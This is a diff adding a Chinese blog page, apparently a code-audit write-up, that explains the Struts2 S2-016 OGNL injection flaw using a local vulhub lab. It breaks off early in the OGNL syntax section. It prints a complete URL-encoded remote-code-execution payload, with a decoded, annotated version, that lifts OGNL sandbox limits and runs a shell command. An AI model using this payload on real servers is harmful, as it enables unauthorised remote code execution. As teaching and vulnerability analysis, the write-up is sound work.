@@ -1,0 +1,1492 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | Struts2 —— S2-016 OGNL 注入原理 - blog</title>
+
+  
+    <meta name="description" content="代码审计 | Struts2 —— S2-016 OGNL 注入原理 本文是 Struts2 漏洞系列的第一篇，以 S2-016 为切入点，重点搞清楚 OGNL 注入的原理。Payload 极简，但背后的机制值得细细拆解。   目录 一、环境搭建与漏洞复现 二、URL 编码的那点细节 三、Payload 结构拆解 四、OGNL 语法入门 OGNL 是什么 OGNL 基本语法 为什么能执行系统命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | Struts2 —— S2-016 OGNL 注入原理">
+<meta property="og:url" content="https://wr0ld.github.io/posts/a7f2b9d3/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="代码审计 | Struts2 —— S2-016 OGNL 注入原理 本文是 Struts2 漏洞系列的第一篇，以 S2-016 为切入点，重点搞清楚 OGNL 注入的原理。Payload 极简，但背后的机制值得细细拆解。   目录 一、环境搭建与漏洞复现 二、URL 编码的那点细节 三、Payload 结构拆解 四、OGNL 语法入门 OGNL 是什么 OGNL 基本语法 为什么能执行系统命令">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-05-10T02:30:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T05:21:00.947Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Struts2">
+<meta property="article:tag" content="S2-016">
+<meta property="article:tag" content="OGNL">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,RCE,Struts2,S2-016,OGNL">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=mozbt5o2">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-10T10:30:00+08:00","dateModified":"2026-05-10T13:21:00+08:00","datePublished":"2026-05-10T10:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-016 OGNL 注入原理","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7f2b9d3/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7f2b9d3/","keywords":"代码审计, Java, RCE, Struts2, S2-016, OGNL","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oM1sigyCiAA6DgFAIPAB3maXXAIyPqmHjE4LY~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
+  
+</head>
+<body><div class="reading-progress-bar"></div>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><div class="menu-divider"></div><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="相册" href="/gallery/" style="color:#FF9FF3"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12" opacity=".5"/><path fill="currentColor" d="M8.5 9.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2"/><path fill="currentColor" fill-rule="evenodd" d="M12 12c0-.943 0-1.414.293-1.707S13.057 10 14 10h2c.943 0 1.414 0 1.707.293S18 11.057 18 12v2c0 .943 0 1.414-.293 1.707S16.943 16 16 16h-2c-.943 0-1.414 0-1.707-.293S12 14.943 12 14zM2 12c0 4.714 0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12m1 6l3.296-3.296a1.117 1.117 0 0 1 1.58 0l.374.373a1.117 1.117 0 0 0 1.58 0l3.17-3.17a1.117 1.117 0 0 1 1.58 0L18 14" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper slide-up todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner slide-up top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/struts2/">struts2</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-05-10T02:30:00.000Z">2026-05-10</time></span><span class="sep"></span><span class="text word-count">字数：23777</span><span class="sep"></span><span class="text img-count">图片：42</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | Struts2 —— S2-016 OGNL 注入原理</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="代码审计-Struts2-——-S2-016-OGNL-注入原理"><a href="#代码审计-Struts2-——-S2-016-OGNL-注入原理" class="headerlink" title="代码审计 | Struts2 —— S2-016 OGNL 注入原理"></a>代码审计 | Struts2 —— S2-016 OGNL 注入原理</h1><blockquote>
+<p>本文是 Struts2 漏洞系列的第一篇，以 S2-016 为切入点，重点搞清楚 OGNL 注入的原理。Payload 极简，但背后的机制值得细细拆解。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">一、环境搭建与漏洞复现</a></li>
+<li><a href="#%E4%BA%8Curl-%E7%BC%96%E7%A0%81%E7%9A%84%E9%82%A3%E7%82%B9%E7%BB%86%E8%8A%82">二、URL 编码的那点细节</a></li>
+<li><a href="#%E4%B8%89payload-%E7%BB%93%E6%9E%84%E6%8B%86%E8%A7%A3">三、Payload 结构拆解</a></li>
+<li><a href="#%E5%9B%9Bognl-%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8">四、OGNL 语法入门</a><ul>
+<li><a href="#ognl-%E6%98%AF%E4%BB%80%E4%B9%88">OGNL 是什么</a></li>
+<li><a href="#ognl-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">OGNL 基本语法</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">为什么能执行系统命令</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%89%8D%E4%B8%A4%E8%A1%8C%E7%BB%95%E8%BF%87">为什么需要前两行绕过</a></li>
+<li><a href="#%E6%95%B4%E4%B8%AA%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">整个执行流程</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%AF%94">五、表达式注入类比</a></li>
+<li><a href="#%E5%85%ADognl-%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81">六、OGNL 示例代码</a><ul>
+<li><a href="#%E7%A4%BA%E4%BE%8B-1%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95">示例 1：基础用法</a></li>
+<li><a href="#%E7%A4%BA%E4%BE%8B-2root-%E5%AF%B9%E8%B1%A1%E4%B8%8E-context-%E7%9A%84%E5%8C%BA%E5%88%AB">示例 2：root 对象与 context 的区别</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%83%E6%90%AD%E5%BB%BA-struts2-%E9%9D%B6%E5%9C%BA%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0">七、搭建 Struts2 靶场（本地复现）</a><ul>
+<li><a href="#%E6%96%B0%E5%BB%BA-tomcat-%E9%A1%B9%E7%9B%AE">新建 Tomcat 项目</a></li>
+<li><a href="#%E5%9B%9B%E4%B8%AA%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE">四个文件配置</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91">验证漏洞触发</a></li>
+<li><a href="#struts2-%E5%AE%8C%E6%95%B4%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B">Struts2 完整请求流程</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%AB%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">八、代码审计</a><ul>
+<li><a href="#%E5%85%A5%E5%8F%A3strutsprepareandexecutefilter">入口：StrutsPrepareAndExecuteFilter</a></li>
+<li><a href="#executeaction-%E4%B8%8E-actionmapping">executeAction 与 ActionMapping</a></li>
+<li><a href="#struts-defaultxml-%E4%B8%8E%E5%90%84%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E7%82%B9">struts-default.xml 与各版本注入点</a></li>
+<li><a href="#%E9%A1%BA%E7%9D%80%E8%B0%83%E7%94%A8%E9%93%BE%E5%BE%80%E4%B8%8B%E8%B5%B0">顺着调用链往下走</a></li>
+<li><a href="#%E6%A0%B8%E5%BF%83%E8%A7%A6%E5%8F%91conditionalparsegnl-%E6%89%A7%E8%A1%8C">核心触发：conditionalParse → OGNL 执行</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93">漏洞根因总结</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B9%9Dpayload-%E8%B0%83%E8%AF%95%E4%B8%8E%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8">九、Payload 调试与完整利用</a><ul>
+<li><a href="#%E7%AE%80%E5%8D%95-rce-payload%E6%97%A0%E5%9B%9E%E6%98%BE">简单 RCE Payload（无回显）</a></li>
+<li><a href="#%E9%97%AE%E9%A2%98%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%A2%AB%E6%8B%A6%E6%88%AA">问题：静态方法被拦截</a></li>
+<li><a href="#payload-2%E7%BB%95%E8%BF%87%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E9%99%90%E5%88%B6">Payload 2：绕过静态方法限制</a></li>
+<li><a href="#payload-3%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E7%89%88">Payload 3：命令回显版</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8D%81%E6%80%BB%E7%BB%93">十、总结</a></li>
+</ul>
+<hr>
+<h2 id="一、环境搭建与漏洞复现"><a href="#一、环境搭建与漏洞复现" class="headerlink" title="一、环境搭建与漏洞复现"></a>一、环境搭建与漏洞复现</h2><p>用 vulhub 起环境，很方便：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-016</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>起来之后访问 <code>http://127.0.0.1:8080/</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3zyx.png"></p>
+<p>用 Yakit 抓个包看看原始请求长什么样：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_efs5.png"></p>
+<p>这是原始的包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gs8g.png"></p>
+<p>把 GET 请求的 URL 参数换成下面这个 Payload（已 URL 编码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D@java.lang.Runtime@getRuntime().exec(%22id%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br></pre></td></tr></table></figure>
+
+<p>可以看到命令执行结果被正常回写了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3luk.png"></p>
+<hr>
+<h2 id="二、URL-编码的那点细节"><a href="#二、URL-编码的那点细节" class="headerlink" title="二、URL 编码的那点细节"></a>二、URL 编码的那点细节</h2><p>这里有个小问题——上面的 Payload 是自己手动 URL 编码过的，如果直接发送未编码版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;id&quot;),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(#d),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不仅没有返回命令结果，还直接 400 了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_h0eu.png"></p>
+<p>这里有个细节：<strong>浏览器的自动编码并不是对整个 URL 都编码</strong>，它只编码它认为”需要编码”的字符，有些字符浏览器认为是 URL 的合法字符就不会动。</p>
+<p>比如 <code>#</code> 这个字符：</p>
+<ul>
+<li>浏览器认为 <code>#</code> 是锚点符号（fragment identifier），<code>#</code> 后面的内容浏览器直接截断，不会发给服务端</li>
+<li>Payload 里大量用了 <code>#_memberAccess</code>、<code>#context</code>、<code>#a</code> 这些，浏览器看到第一个 <code>#</code> 就认为后面是页面锚点，直接不发了，服务端收到的请求是残缺的</li>
+</ul>
+<p>而手动编码的版本里 <code>#</code> 变成了 <code>%23</code>，浏览器不认识这是锚点，原样发给服务端，服务端 URL decode 之后才还原成 <code>#</code>，OGNL 正常执行。</p>
+<p><strong>小结：</strong></p>
+<ul>
+<li><code>#</code> 在 URL 里有特殊含义（锚点）</li>
+<li>浏览器不会自动把 <code>#</code> 编码成 <code>%23</code></li>
+<li>所以含 <code>#</code> 的 Payload 必须手动提前编码好再放进 URL</li>
+</ul>
+<hr>
+<h2 id="三、Payload-结构拆解"><a href="#三、Payload-结构拆解" class="headerlink" title="三、Payload 结构拆解"></a>三、Payload 结构拆解</h2><p>把 Payload 格式化出来看更清楚：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;</span><br><span class="line">  // 第一步：关闭方法执行限制</span><br><span class="line">  #context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,</span><br><span class="line"></span><br><span class="line">  // 第二步：开启静态方法访问（用反射改掉这个字段）</span><br><span class="line">  #f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),</span><br><span class="line">  #f.setAccessible(true),</span><br><span class="line">  #f.set(#_memberAccess,true),</span><br><span class="line"></span><br><span class="line">  // 第三步：执行命令</span><br><span class="line">  #a=@java.lang.Runtime@getRuntime().exec(&quot;id&quot;),</span><br><span class="line"></span><br><span class="line">  // 第四步：读取输出</span><br><span class="line">  #b=new java.io.InputStreamReader(#a.getInputStream()),</span><br><span class="line">  #c=new java.io.BufferedReader(#b),</span><br><span class="line">  #d=#c.readLine(),</span><br><span class="line"></span><br><span class="line">  // 第五步：写回 Response 实现回显</span><br><span class="line">  #matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">  #matt.getWriter().println(#d),</span><br><span class="line">  #matt.getWriter().flush(),</span><br><span class="line">  #matt.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>五步走，先撬锁再执行，后面代码审计的时候会挨个对应。</p>
+<hr>
+<h2 id="四、OGNL-语法入门"><a href="#四、OGNL-语法入门" class="headerlink" title="四、OGNL 语法入门"></a>四、OGNL 语法入门</h2><p>在搞清楚漏洞细节之前，先把 OGNL 是什么搞明白，不然后面看代码会很懵。</p>
+<h3 id="OGNL-是什么"><a href="#OGNL-是什么" class="headerlink" title="OGNL 是什么"></a>OGNL 是什么</h3><p>OGNL &#x3D; <strong>Object-Graph Navigation Language</strong>，对象图导航语言。Struts2 用它来做表达式求值，比如在页面上取值 <code>$&#123;user.name&#125;</code> 这种。</p>
+<p>它本质上就是一个可以在运行时执行 Java 代码的表达式引擎。</p>
